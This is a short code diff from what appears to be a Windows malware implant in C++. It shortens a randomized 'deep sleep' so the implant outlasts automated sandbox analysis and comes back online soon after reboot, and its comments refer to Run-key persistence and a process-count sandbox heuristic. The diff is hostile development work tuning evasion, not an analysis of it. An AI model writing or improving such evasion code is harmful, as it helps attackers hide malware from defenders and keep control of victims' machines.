@@ -29,11 +29,15 @@ static void GhostSleep(DWORD ms) {
     }
 }
 
-// ─── Deep sleep (1–4 hours) ───────────────────────────────────────────────────
+// ─── Deep sleep (15–30 min) ──────────────────────────────────────────────────
+// Outlasts short sandbox detonations (3–10 min), but short enough that a
+// fresh boot / reboot recovers quickly — the old 1–4h window took the
+// implant offline for hours after every reboot (Run-key fires at logon with
+// <50 processes → sandbox heuristic trips → hours of dead air).
 VOID DeepSleep() {
     std::random_device rd;
     std::mt19937 gen(rd());
-    std::uniform_int_distribution<DWORD> dist(3600000, 14400000); // 1–4 hours in ms
+    std::uniform_int_distribution<DWORD> dist(900000, 1800000); // 15–30 min in ms
     DWORD sleepMs = dist(gen);
     GhostSleep(sleepMs);
 }
